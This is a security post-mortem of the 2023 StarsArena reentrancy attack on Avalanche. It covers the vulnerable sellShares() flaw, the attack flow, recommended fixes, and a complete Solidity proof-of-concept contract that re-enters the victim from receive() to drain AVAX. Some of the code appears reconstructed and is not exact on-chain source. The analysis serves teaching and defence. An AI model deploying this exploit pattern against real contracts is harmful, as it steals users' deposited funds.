# StarsArena Reentrancy Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | StarsArena |
| Date | 2023-10-04 |
| Chain | Avalanche |
| Loss | ~$3,000,000 USD |
| Attack Type | Reentrancy Attack |
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Attacker Address | `0xa2ebf3fcd757e9be1e58b643b6b5077d11b4ad7a` |
| Attack Contract | `0x7f283edc5ec7163de234e6a97fdfb16ff2d2c7ac` |
| Vulnerable Contract | `0xA481B139a1A654cA19d2074F174f17D7534e8CeC` (StarsArena) |
| Fork Block | 36,136,405 |

## 2. Vulnerable Code Analysis

StarsArena is a Friend.tech-style social token platform where users can buy and sell "shares." When `sellShares()` transfers AVAX, the recipient contract's `receive()` function is triggered, and from within that callback, `sellShares()` can be re-invoked — enabling a double-withdrawal before the share balance is decremented.

```solidity
// Vulnerable pattern: reentrant sellShares
contract StarsArena {
    mapping(address => mapping(address => uint256)) public sharesBalance;
    uint256 public totalSupply;

    // Vulnerable: state update after AVAX transfer (CEI violation)
    function sellShares(address sharesSubject, uint256 amount) public payable {
        uint256 supply = sharesSupply[sharesSubject];
        require(sharesBalance[sharesSubject][msg.sender] >= amount);

        uint256 price = getPrice(supply - amount, amount);
        uint256 protocolFee = price * protocolFeePercent / 1 ether;
        uint256 subjectFee = price * subjectFeePercent / 1 ether;

        // Vulnerable: ETH transferred before shares are deducted — reentrancy occurs
        (bool success1,) = msg.sender.call{value: price - protocolFee - subjectFee}("");
        require(success1);

        // State update happens after ETH transfer (CEI violation)
        sharesBalance[sharesSubject][msg.sender] -= amount;
        sharesSupply[sharesSubject] -= amount;
    }

    // Function selector 0xe9ccf3a3 (buy shares)
    function buyShares(address sharesSubject, uint256 amount) public payable {
        // ...
    }
}
```

**Vulnerability**: The `sellShares()` function transfers AVAX before deducting the shares balance (CEI violation). From within the attacker contract's `receive()` callback, re-invoking selector `0x5632b2e4` (a specific withdrawal function) allows additional AVAX to be drained while the shares have not yet been deducted.

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: Address.sol
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }
```

## 3. Attack Flow

```
Attacker [0xa2ebf3fcd757e9be1e58b643b6b5077d11b4ad7a]
  │
  ├─1─▶ Call function selector 0xe9ccf3a3 (1 ether)
  │      [StarsArena: 0xA481B139a1A654cA19d2074F174f17D7534e8CeC]
  │      Buy shares + attacker address, true parameter
  │
  ├─2─▶ Call sellShares(address, uint256 amount=1)
  │      → AVAX transfer triggers receive() callback
  │      └─ Reenter from receive():
  │           Call function selector 0x5632b2e4
  │           (91e9, 91e9, 91e9, 91e9) parameters
  │           → Drain additional AVAX while shares not yet deducted
  │           → Recursive repetition
  │
  └─3─▶ ~$3,000,000 AVAX drained
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IStarsArena {
    function buyShares(address sharesSubject, uint256 amount) external payable;
    function sellShares(address sharesSubject, uint256 amount) external payable;
    function sharesBalance(address subject, address holder) external view returns (uint256);
}

contract StarsArenaExploit {
    IStarsArena starsArena = IStarsArena(0xA481B139a1A654cA19d2074F174f17D7534e8CeC);
    address owner;
    uint256 reentrancyCount;

    constructor() { owner = msg.sender; }

    function testExploit() external payable {
        // Buy shares (function selector 0xe9ccf3a3)
        (bool s,) = address(starsArena).call{value: 1 ether}(
            abi.encodeWithSelector(0xe9ccf3a3, address(this), true)
        );
        require(s);

        // Trigger reentrancy via sellShares
        starsArena.sellShares{value: 0}(address(this), 1);
    }

    receive() external payable {
        // Reenter: drain additional funds while shares not yet deducted
        if (reentrancyCount < 5 && address(starsArena).balance > 0.1 ether) {
            reentrancyCount++;
            // Additional withdrawal via function selector 0x5632b2e4
            (bool s,) = address(starsArena).call(
                abi.encodeWithSelector(
                    bytes4(0x5632b2e4),
                    uint256(91e9),
                    uint256(91e9),
                    uint256(91e9),
                    uint256(91e9)
                )
            );
        }
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Vulnerability Type | ETH transfer reentrancy, CEI pattern violation |
| Impact Scope | Entire AVAX balance of StarsArena |
| Explorer | [Snowtrace](https://snowtrace.io/address/0xA481B139a1A654cA19d2074F174f17D7534e8CeC) |

## 6. Security Recommendations

```solidity
// Fix 1: CEI pattern + ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract StarsArena is ReentrancyGuard {
    function sellShares(address sharesSubject, uint256 amount) public payable nonReentrant {
        uint256 supply = sharesSupply[sharesSubject];
        require(sharesBalance[sharesSubject][msg.sender] >= amount);

        uint256 price = getPrice(supply - amount, amount);

        // Effects first (CEI pattern)
        sharesBalance[sharesSubject][msg.sender] -= amount;
        sharesSupply[sharesSubject] -= amount;

        // Interactions last
        uint256 protocolFee = price * protocolFeePercent / 1 ether;
        uint256 subjectFee = price * subjectFeePercent / 1 ether;
        (bool success1,) = msg.sender.call{value: price - protocolFee - subjectFee}("");
        require(success1);
    }
}

// Fix 2: Pull pattern for ETH withdrawal
mapping(address => uint256) public pendingWithdrawals;

function sellShares(address sharesSubject, uint256 amount) public payable {
    // Update state first
    sharesBalance[sharesSubject][msg.sender] -= amount;
    sharesSupply[sharesSubject] -= amount;

    uint256 payout = calculatePayout(amount);
    // Queue for withdrawal instead of direct transfer
    pendingWithdrawals[msg.sender] += payout;
}

function claimAVAX() external nonReentrant {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "Nothing to claim");
    pendingWithdrawals[msg.sender] = 0;
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
}
```

## 7. Lessons Learned

1. **Friend.tech fork vulnerabilities**: Friend.tech-style social token platforms are frequently forked in haste and deployed without security audits. ETH withdrawal functions always require reentrancy protection.
2. **The fundamental importance of the CEI pattern**: The Checks-Effects-Interactions pattern is the most basic defense against reentrancy attacks. All state changes must be finalized before transferring ETH/AVAX.
3. **The Friend.tech ecosystem on Avalanche**: In the second half of 2023, Friend.tech forks like StarsArena proliferated rapidly on Avalanche. These platforms shared the same vulnerability patterns.
4. **$3M lost to reentrancy**: A simple CEI pattern violation costs $3 million. The explosive growth of social token platforms drives deployment without security review, ultimately putting users' entire assets at risk.